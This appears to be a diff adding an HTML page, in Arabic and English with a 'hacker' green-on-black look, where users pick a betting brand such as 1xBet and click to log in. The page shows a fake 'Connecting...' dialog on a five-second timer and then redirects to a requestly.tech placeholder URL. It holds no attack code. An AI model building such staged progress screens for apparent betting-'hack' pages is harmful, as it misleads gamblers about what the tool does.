@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Select Your Betting Company</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.9);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #0f0;
+        }
+
+        h1 {
+            font-size: 2rem;
+            text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
+            margin-bottom: 20px;
+        }
+
+        select {
+            width: 80%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            background-color: #111;
+            color: #0f0;
+        }
+
+        button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2rem;
+            color: #000;
+            background-color: #0f0;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            background-color: #0a0;
+        }
+
+        .dialog {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #000;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #0f0;
+            text-align: center;
+            color: #0f0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>حدد شركة الرهان الخاصة بك</h1>
+        <select id="companySelect">
+            <option value="1xbet">1xBet</option>
+            <option value="melbet">Melbet</option>
+            <option value="megapire">Megapire</option>
+            <option value="goobet">Goobet</option>
+            <option value="linebet">Linebet</option>
+        </select>
+        <button onclick="login()">دخول</button>
+    </div>
+
+    <div class="dialog" id="loadingDialog">
+        <h2>Connecting...</h2>
+        <p>Please wait</p>
+    </div>
+
+    <script>
+        function login() {
+            const dialog = document.getElementById('loadingDialog');
+            dialog.style.display = 'block';
+
+            setTimeout(() => {
+                dialog.style.display = 'none';
+                window.location.href = 'https://user1730655102878.requestly.tech/user.html?'; // استبدل بـ الصفحة التالية
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
